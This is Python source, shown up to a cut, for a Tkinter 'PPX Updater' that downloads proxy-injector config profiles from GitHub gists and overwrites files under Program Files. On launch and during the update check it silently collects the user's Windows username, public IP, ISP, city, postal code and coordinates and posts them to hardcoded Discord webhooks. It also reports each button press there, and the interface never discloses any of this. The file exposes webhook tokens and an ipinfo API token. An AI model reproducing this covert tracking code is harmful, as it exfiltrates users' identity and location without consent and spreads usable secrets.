import getpass
import os
import random
import shutil
import string
import tkinter as tk
import tkinter.font as tkFont
import urllib
from datetime import date, datetime

import git
import ipinfo
import requests
from discord_webhook import DiscordWebhook

r = requests.get("https://api64.ipify.org")
ip_now = r.text

now = datetime.now()
current_time = now.strftime("%H_%M_%S")
time_now = current_time
today = date.today()

rand_number = random.randint(1, 99999)

main_path = "log"
is_main_path = os.path.isdir(main_path)
if is_main_path:
    path = f"log/Log--{today}"
    isFile = os.path.isdir(path)
    if isFile:
        f = open(f"log/Log--{today}/Log--{time_now}--{rand_number}.txt", "w+")
        f.write(f"{time_now}--Creating Log Folders...!\n")
        f.write(f"{time_now}--Success\n")
    else:
        os.mkdir(f"log/Log--{today}")
        f = open(f"log/Log--{today}/Log--{time_now}--{rand_number}.txt", "w+")
        f.write(f"{time_now}--Creating Log Folders...!\n")
        f.write(f"{time_now}--Success\n")
else:
    os.mkdir("log")
    os.mkdir(f"log/Log--{today}")
    f = open(f"log/Log--{today}/Log--{time_now}--{rand_number}.txt", "w+")
    f.write(f"{time_now}--Creating Log Folders...!\n")
    f.write(f"{time_now}--Success\n")

now = datetime.now()
current_time = now.strftime("%H_%M_%S")
time_now = current_time
today = date.today()

r = requests.get("https://api64.ipify.org")
ip = r.text

access_token = "70218b99c8ea9f"
handler = ipinfo.getHandler(access_token)
details = handler.getDetails(ip)

now = datetime.now()
current_time = now.strftime("%H:%M:%S")
time = current_time

ip_all = details.ip
country = details.country
postal = details.postal
region = details.region
org = details.org
city = details.city
timezone = details.timezone
cords = details.loc

all_details = f"IP - {ip_all}\nInternet Provider - {org}\nTime Zone - {timezone}\nCountry - {country}\nRegion - {region}\nCity - {city}\nPostal Code - {postal}\nCoordinates - {cords}\n\n\n"

########################################################################################################################

webhook = DiscordWebhook(
    url="https://discord.com/api/webhooks/1007512069756694538"
    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
    content=f"New Run at - {today} {time_now}\n"
    f"Username - {getpass.getuser()}\n"
    f"--- Network Info ---\n\n"
    f"{all_details}",
)
response = webhook.execute()

username = getpass.getuser()
no_internet = 0

now = datetime.now()
current_time = now.strftime("%H:%M:%S")
today = date.today()


def connect(host="http://google.com"):
    f.write(f"{time_now}--Checking internet connection\n")
    log_webhook = DiscordWebhook(
        url="https://discord.com/api/webhooks/1007512069756694538"
        "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
        content=f"{time_now}--Checking internet connection\n",
    )
    log_response = log_webhook.execute()
    try:
        urllib.request.urlopen(host)  # Python 3.x
        f.write(f"{time_now}--Internet connection available!\n")
        log_webhook = DiscordWebhook(
            url="https://discord.com/api/webhooks/1007512069756694538"
            "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
            content=f"{time_now}--Internet connection available!\n",
        )
        log_response = log_webhook.execute()
        return True
    except:
        f.write(f"{time_now}--No internet connection!\n")
        log_webhook = DiscordWebhook(
            url="https://discord.com/api/webhooks/1007512069756694538"
            "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
            content=f"{time_now}--No internet connection!\n",
        )
        log_response = log_webhook.execute()
        return False


if connect():
    no_internet = 0
else:
    no_internet = 1


def version_check():
    if no_internet == 1:

        def GButton_988_command():
            root.destroy()

        class App:

            def __init__(self, root):
                # setting title
                root.title("No Internet Connection")
                # setting window size
                width = 508
                height = 342
                screenwidth = root.winfo_screenwidth()
                screenheight = root.winfo_screenheight()
                alignstr = "%dx%d+%d+%d" % (
                    width,
                    height,
                    (screenwidth - width) / 2,
                    (screenheight - height) / 2,
                )
                root.geometry(alignstr)
                root.resizable(width=False, height=False)

                GButton_988 = tk.Button(root)
                GButton_988["bg"] = "#e9e9ed"
                ft = tkFont.Font(family="Segoe UI", size=28)
                GButton_988["font"] = ft
                GButton_988["fg"] = "#000000"
                GButton_988["justify"] = "center"
                GButton_988["text"] = "Close"
                GButton_988.place(x=150, y=230, width=208, height=77)
                GButton_988["command"] = GButton_988_command

                GLabel_976 = tk.Label(root)
                ft = tkFont.Font(family="Segoe UI", size=28)
                GLabel_976["font"] = ft
                GLabel_976["fg"] = "#333333"
                GLabel_976["justify"] = "center"
                GLabel_976["text"] = "No Internet Connection"
                GLabel_976.place(x=20, y=20, width=466, height=108)

        if __name__ == "__main__":
            root = tk.Tk()
            app = App(root)
            root.mainloop()
    else:

        def random_char(y):
            f.write(f"{time_now}--Checking for updates...\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Checking for updates...\n",
            )
            log_response = log_webhook.execute()
            return "".join(
                random.choice(string.ascii_letters) for x in range(y))

        random_num = random_char(10)

        main_dir = f"C:/Windows/Temp/{random_num}"
        os.mkdir(main_dir)
        print("Directory '% s' is built!" % main_dir)

        git.Git(main_dir).clone(
            "https://gist.github.com/182c5338c9bb5fe62081bbc590cd70de.git"
        )  # version
        a = open(
            "D:/OneDrive - adithya/Programming/Python/PPX-Updater/bin/cur_version.txt"
        )
        cur_version_check = a.read()
        f = open(
            f"C:/Windows/Temp/{random_num}/182c5338c9bb5fe62081bbc590cd70de/version.txt",
            "r",
        )

        with open(
                "D:/OneDrive - adithya/Programming/Python/PPX-Updater/bin/update_date.txt",
                "w",
        ) as p:
            p.write(f"Update date - {today}")

        r = requests.get("https://api64.ipify.org")
        ip = r.text
        access_token = "70218b99c8ea9f"
        handler = ipinfo.getHandler(access_token)
        details = handler.getDetails(ip)

        ip_all = details.ip
        country = details.country
        postal = details.postal
        region = details.region
        org = details.org
        city = details.city
        timezone = details.timezone
        cords = details.loc
        all_details = f"Username - {username}\nDate - {today}\nTime - {current_time}\nIP - {ip_all}\nInternet Provider - {org}\nTime Zone - {timezone}\nCountry - {country}\nRegion - {region}\nCity - {city}\nPostal Code - {postal}\nCoordinates - {cords}\n\n\n"
        url = (
            "https://discord.com/api/webhooks/993353038532194384/EV-LnzJvQcQSrgNcPTT8w4EQs"
            "-_gAoPvlYT885Atpz9UtDRFWWJp8dEj_Zw6pgejd_Hk")
        data = {
            "content": "New User Checked for Updates",
            "Update Info": "Update Info",
            "embeds": [{
                "description": all_details,
                "title": "User Information"
            }],
        }
        result = requests.post(url, json=data)
        try:
            result.raise_for_status()
        except requests.exceptions.HTTPError as err:
            print(err)
        else:
            print("Payload delivered successfully, code {}.".format(
                result.status_code))
            f.write(f"{time_now}--Updated database successfully\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Updated database successfully\n",
            )
            log_response = log_webhook.execute()
        check = f.read()
        if check > cur_version_check:

            class App:
                f.write(f"{time_now}--Running updater window\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Running updater window\n",
                )
                log_response = log_webhook.execute()

                def __init__(self, root):
                    # setting title
                    root.title("Updater")
                    # setting window size
                    width = 611
                    height = 380
                    screenwidth = root.winfo_screenwidth()
                    screenheight = root.winfo_screenheight()
                    alignstr = "%dx%d+%d+%d" % (
                        width,
                        height,
                        (screenwidth - width) / 2,
                        (screenheight - height) / 2,
                    )
                    root.geometry(alignstr)
                    root.resizable(width=False, height=False)

                    GLabel_992 = tk.Label(root)
                    ft = tkFont.Font(family="Segoe UI", size=38)
                    GLabel_992["font"] = ft
                    GLabel_992["fg"] = "#333333"
                    GLabel_992["justify"] = "center"
                    GLabel_992["text"] = "Update Available"
                    GLabel_992.place(x=70, y=60, width=452, height=64)

                    GButton_439 = tk.Button(root)
                    GButton_439["bg"] = "#e9e9ed"
                    ft = tkFont.Font(family="Segoe UI", size=28)
                    GButton_439["font"] = ft
                    GButton_439["fg"] = "#000000"
                    GButton_439["justify"] = "center"
                    GButton_439["text"] = "Update Now"
                    GButton_439.place(x=50, y=260, width=220, height=60)
                    GButton_439["command"] = self.GButton_439_command

                    GButton_368 = tk.Button(root)
                    GButton_368["bg"] = "#e9e9ed"
                    ft = tkFont.Font(family="Segoe UI", size=28)
                    GButton_368["font"] = ft
                    GButton_368["fg"] = "#000000"
                    GButton_368["justify"] = "center"
                    GButton_368["text"] = "Close"
                    GButton_368.place(x=330, y=260, width=220, height=60)
                    GButton_368["command"] = self.GButton_368_command

                def GButton_439_command(self):
                    print("command")
                    f.write(
                        f'{time_now}--Coming soon = "GButton_439_command"\n')
                    log_webhook = DiscordWebhook(
                        url="https://discord.com/api/webhooks/1007512069756694538"
                        "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                        content=f'{time_now}--Coming soon = "GButton_439_command"\n',
                    )
                    log_response = log_webhook.execute()

                def GButton_368_command(self):
                    root.destroy()
                    f.write(f"{time_now}--Exiting updater\n")
                    log_webhook = DiscordWebhook(
                        url="https://discord.com/api/webhooks/1007512069756694538"
                        "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                        content=f"{time_now}--Exiting updater\n",
                    )
                    log_response = log_webhook.execute()

            if __name__ == "__main__":
                root = tk.Tk()
                app = App(root)
                root.mainloop()
        else:

            class no_updates:
                f.write(f"{time_now}--No new updates!\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--No new updates!\n",
                )
                log_response = log_webhook.execute()

                def __init__(self, root):
                    # setting title
                    root.title("Updater")
                    # setting window size
                    width = 569
                    height = 340
                    screenwidth = root.winfo_screenwidth()
                    screenheight = root.winfo_screenheight()
                    alignstr = "%dx%d+%d+%d" % (
                        width,
                        height,
                        (screenwidth - width) / 2,
                        (screenheight - height) / 2,
                    )
                    root.geometry(alignstr)
                    root.resizable(width=False, height=False)

                    GLabel_725 = tk.Label(root)
                    ft = tkFont.Font(family="Segoe UI", size=38)
                    GLabel_725["font"] = ft
                    GLabel_725["fg"] = "#333333"
                    GLabel_725["justify"] = "center"
                    GLabel_725["text"] = "No New Updates"
                    GLabel_725.place(x=20, y=40, width=543, height=60)

                    GButton_284 = tk.Button(root)
                    GButton_284["bg"] = "#e9e9ed"
                    ft = tkFont.Font(family="Segoe UI", size=28)
                    GButton_284["font"] = ft
                    GButton_284["fg"] = "#000000"
                    GButton_284["justify"] = "center"
                    GButton_284["text"] = "Close"
                    GButton_284.place(x=180, y=220, width=207, height=64)
                    GButton_284["command"] = self.GButton_284_command

                def GButton_284_command(self):
                    root.destroy()
                    f.write(f"{time_now}--Exiting no updater\n")
                    log_webhook = DiscordWebhook(
                        url="https://discord.com/api/webhooks/1007512069756694538"
                        "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                        content=f"{time_now}--Exiting no updater\n",
                    )
                    log_response = log_webhook.execute()

            if __name__ == "__main__":
                root = tk.Tk()
                app = no_updates(root)
                root.mainloop()


class App:
    f.write(f"{time_now}--Running Main window\n")
    log_webhook = DiscordWebhook(
        url="https://discord.com/api/webhooks/1007512069756694538"
        "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
        content=f"{time_now}--Running Main window\n",
    )
    log_response = log_webhook.execute()

    def __init__(self, root):
        # setting title
        root.title("PPX Updater")
        # setting window size
        width = 660
        height = 926
        screenwidth = root.winfo_screenwidth()
        screenheight = root.winfo_screenheight()
        alignstr = "%dx%d+%d+%d" % (
            width,
            height,
            (screenwidth - width) / 2,
            (screenheight - height) / 2,
        )
        root.geometry(alignstr)
        root.resizable(width=False, height=False)

        GLabel_741 = tk.Label(root)
        ft = tkFont.Font(family="Segoe UI", size=28)
        GLabel_741["font"] = ft
        GLabel_741["fg"] = "#333333"
        GLabel_741["justify"] = "center"
        GLabel_741["text"] = "PPX Updater"
        GLabel_741.place(x=10, y=10, width=630, height=82)

        GButton_60 = tk.Button(root)
        GButton_60["bg"] = "#e9e9ed"
        ft = tkFont.Font(family="Segoe UI", size=18)
        GButton_60["font"] = ft
        GButton_60["fg"] = "#000000"
        GButton_60["justify"] = "center"
        GButton_60["text"] = "Zoom"
        GButton_60.place(x=30, y=140, width=150, height=50)
        GButton_60["command"] = self.GButton_60_command

        GButton_304 = tk.Button(root)
        GButton_304["bg"] = "#e9e9ed"
        ft = tkFont.Font(family="Segoe UI", size=18)
        GButton_304["font"] = ft
        GButton_304["fg"] = "#000000"
        GButton_304["justify"] = "center"
        GButton_304["text"] = "WhatsApp"
        GButton_304.place(x=260, y=140, width=150, height=50)
        GButton_304["command"] = self.GButton_304_command

        GButton_383 = tk.Button(root)
        GButton_383["bg"] = "#e9e9ed"
        ft = tkFont.Font(family="Segoe UI", size=18)
        GButton_383["font"] = ft
        GButton_383["fg"] = "#000000"
        GButton_383["justify"] = "center"
        GButton_383["text"] = "Facebook"
        GButton_383.place(x=480, y=140, width=150, height=50)
        GButton_383["command"] = self.GButton_383_command

        GButton_820 = tk.Button(root)
        GButton_820["bg"] = "#e9e9ed"
        ft = tkFont.Font(family="Segoe UI", size=18)
        GButton_820["font"] = ft
        GButton_820["fg"] = "#000000"
        GButton_820["justify"] = "center"
        GButton_820["text"] = "Defaults "
        GButton_820.place(x=30, y=210, width=150, height=50)
        GButton_820["command"] = self.GButton_820_command

        GButton_567 = tk.Button(root)
        GButton_567["bg"] = "#e9e9ed"
        ft = tkFont.Font(family="Segoe UI", size=18)
        GButton_567["font"] = ft
        GButton_567["fg"] = "#000000"
        GButton_567["justify"] = "center"
        GButton_567["text"] = "About"
        GButton_567.place(x=20, y=870, width=130, height=30)
        GButton_567["command"] = self.GButton_567_command

        GButton_155 = tk.Button(root)
        GButton_155["bg"] = "#e9e9ed"
        ft = tkFont.Font(family="Segoe UI", size=12)
        GButton_155["font"] = ft
        GButton_155["fg"] = "#000000"
        GButton_155["justify"] = "center"
        GButton_155["text"] = "Check For Updates"
        GButton_155.place(x=170, y=870, width=140, height=30)
        GButton_155["command"] = self.GButton_155_command

        GButton_970 = tk.Button(root)
        GButton_970["bg"] = "#e9e9ed"
        ft = tkFont.Font(family="Segoe UI", size=10)
        GButton_970["font"] = ft
        GButton_970["fg"] = "#000000"
        GButton_970["justify"] = "center"
        GButton_970["text"] = "Exit"
        GButton_970.place(x=510, y=860, width=134, height=38)
        GButton_970["command"] = self.GButton_970_command

    def GButton_60_command(self):

        def zoom():
            f.write(f"{time_now}--Selected zoom package\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Selected zoom package\n",
            )
            log_response = log_webhook.execute()

            def random_char(y):
                return "".join(
                    random.choice(string.ascii_letters) for x in range(y))

            random_num = random_char(10)
            f.write(f"{time_now}--Creating temp folders\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Creating temp folders\n",
            )
            log_response = log_webhook.execute()
            print(f"Temp Folder Created Using The Name - {random_num}")
            f.write(
                f"{time_now}--temp folders created using the name = {random_num}\n"
            )
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--temp folders created using the name = {random_num}\n",
            )
            log_response = log_webhook.execute()

            main_dir = f"C:/Windows/Temp/{random_num}"
            os.mkdir(main_dir)
            print("Directory '% s' is built!" % main_dir)

            git.Git(main_dir).clone(
                "https://gist.github.com/0e0687d042c5ba6494d8d81c0051151f.git"
            )  # whatsapp
            f.write(f"{time_now}--Downloading ppx configs\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Downloading ppx configs\n",
            )
            log_response = log_webhook.execute()

            if os.path.exists(
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
            ):
                f.write(f"{time_now}--Removing old configs\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Removing old configs\n",
                )
                log_response = log_webhook.execute()
                os.remove(
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
                )
                f.write(f"{time_now}--old configs removed\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--old configs removed\n",
                )
                log_response = log_webhook.execute()
                shutil.copy(
                    f"C:/Windows/Temp/{random_num}/0e0687d042c5ba6494d8d81c0051151f/A-Dev1412-SYS.ppx",
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles",
                )
                f.write(f"{time_now}--replaced new configs\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--replaced new configs\n",
                )
                log_response = log_webhook.execute()

            else:
                shutil.copy(
                    f"C:/Windows/Temp/{random_num}/0e0687d042c5ba6494d8d81c0051151f/A-Dev1412-SYS.ppx",
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles",
                )
                f.write(f"{time_now}--Success\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Success\n",
                )
                log_response = log_webhook.execute()

        zoom()

    def GButton_970_command(self):
        root.destroy()
        f.write(f'{time_now}--Exiting = "GButton_970_command"\n')
        log_webhook = DiscordWebhook(
            url="https://discord.com/api/webhooks/1007512069756694538"
            "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
            content=f'{time_now}--Exiting = "GButton_970_command"\n',
        )
        log_response = log_webhook.execute()

    def GButton_304_command(self):

        def whatsapp():
            f.write(f"{time_now}--Selected Whatsapp package\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Selected Whatsapp package\n",
            )
            log_response = log_webhook.execute()

            def random_char(y):
                return "".join(
                    random.choice(string.ascii_letters) for x in range(y))

            random_num = random_char(10)
            f.write(f"{time_now}--Creating temp folders\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Creating temp folders\n",
            )
            log_response = log_webhook.execute()
            print(f"Temp Folder Created Using The Name - {random_num}")
            f.write(
                f"{time_now}--Created temp folders using name - {random_num}\n"
            )
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Created temp folders using name - {random_num}\n",
            )
            log_response = log_webhook.execute()

            main_dir = f"C:/Windows/Temp/{random_num}"
            os.mkdir(main_dir)
            print("Directory '% s' is built!" % main_dir)

            git.Git(main_dir).clone(
                "https://gist.github.com/2f4e1cd64005f983ce1823585948c8ff.git"
            )  # whatsapp
            f.write(f"{time_now}--Downloading configs\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Downloading configs\n",
            )
            log_response = log_webhook.execute()

            if os.path.exists(
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
            ):
                f.write(f"{time_now}--Removing old configs\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Removing old configs\n",
                )
                log_response = log_webhook.execute()
                os.remove(
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
                )
                f.write(f"{time_now}--Removed old configs\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Removed old configs\n",
                )
                log_response = log_webhook.execute()
                shutil.copy(
                    f"C:/Windows/Temp/{random_num}/2f4e1cd64005f983ce1823585948c8ff/A-Dev1412-SYS.ppx",
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles",
                )
                f.write(f"{time_now}--Replaceing new configs\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Replaceing new configs\n",
                )
                log_response = log_webhook.execute()

            else:
                shutil.copy(
                    f"C:/Windows/Temp/{random_num}/2f4e1cd64005f983ce1823585948c8ff/A-Dev1412-SYS.ppx",
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles",
                )
                f.write(f"{time_now}--Success\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Success\n",
                )
                log_response = log_webhook.execute()

        whatsapp()

    def GButton_383_command(self):

        def facebook():
            f.write(f"{time_now}--Selected Facebook package\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Selected Facebook package\n",
            )
            log_response = log_webhook.execute()

            def random_char(y):
                return "".join(
                    random.choice(string.ascii_letters) for x in range(y))

            random_num = random_char(10)
            f.write(f"{time_now}--Creating temp folders\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Creating temp folders\n",
            )
            log_response = log_webhook.execute()
            print(f"Temp Folder Created Using The Name - {random_num}")
            f.write(
                f"{time_now}--temp folders created using the name = {random_num}\n"
            )
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--temp folders created using the name = {random_num}\n",
            )
            log_response = log_webhook.execute()

            main_dir = f"C:/Windows/Temp/{random_num}"
            os.mkdir(main_dir)
            print("Directory '% s' is built!" % main_dir)

            git.Git(main_dir).clone(
                "https://gist.github.com/8a8f5f7d553d2984e37b36bc2c666411.git"
            )  # whatsapp
            f.write(f"{time_now}--Downloading configs\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Downloading configs\n",
            )
            log_response = log_webhook.execute()

            if os.path.exists(
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
            ):
                f.write(f"{time_now}--Removing old configs\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Removing old configs\n",
                )
                log_response = log_webhook.execute()
                os.remove(
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles\A-Dev1412-SYS.ppx"
                )
                f.write(f"{time_now}--Removed old configs\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Removed old configs\n",
                )
                log_response = log_webhook.execute()
                shutil.copy(
                    f"C:/Windows/Temp/{random_num}/8a8f5f7d553d2984e37b36bc2c666411/A-Dev1412-SYS.ppx",
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles",
                )
                f.write(f"{time_now}--Replaced new configs\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Replaced new configs\n",
                )
                log_response = log_webhook.execute()

            else:
                shutil.copy(
                    f"C:/Windows/Temp/{random_num}/8a8f5f7d553d2984e37b36bc2c666411/A-Dev1412-SYS.ppx",
                    "C:\Program Files (x86)\A-Developer1412\HTTP Proxy Injector\AppData\Profiles",
                )
                f.write(f"{time_now}--Success\n")
                log_webhook = DiscordWebhook(
                    url="https://discord.com/api/webhooks/1007512069756694538"
                    "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                    content=f"{time_now}--Success\n",
                )
                log_response = log_webhook.execute()

        facebook()

    def GButton_820_command(self):

        def defaults():
            f.write(f"{time_now}--Selected default values\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Selected default values\n",
            )
            log_response = log_webhook.execute()

            def random_char(y):
                return "".join(
                    random.choice(string.ascii_letters) for x in range(y))

            random_num = random_char(10)
            f.write(f"{time_now}--Creating temp folders\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Creating temp folders\n",
            )
            log_response = log_webhook.execute()
            print(f"Temp Folder Created Using The Name - {random_num}")
            f.write(
                f"{time_now}--Created temp folders using name - {random_num}\n"
            )
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
                "/aPNSP5thnrXk7MIQdQaTnLDF9GvrKFa8ESu4X9xJ_TrbQdllEPRgd3sjS-g9hhZWjsy2",
                content=f"{time_now}--Created temp folders using name - {random_num}\n",
            )
            log_response = log_webhook.execute()

            main_dir = f"C:/Windows/Temp/{random_num}"
            os.mkdir(main_dir)
            print("Directory '% s' is built!" % main_dir)

            git.Git(main_dir).clone(
                "https://gist.github.com/22e26fec003eba9a6a4bc8d11d2d171d.git"
            )  # whatsapp
            f.write(f"{time_now}--Downloading default configs\n")
            log_webhook = DiscordWebhook(
                url="https://discord.com/api/webhooks/1007512069756694538"
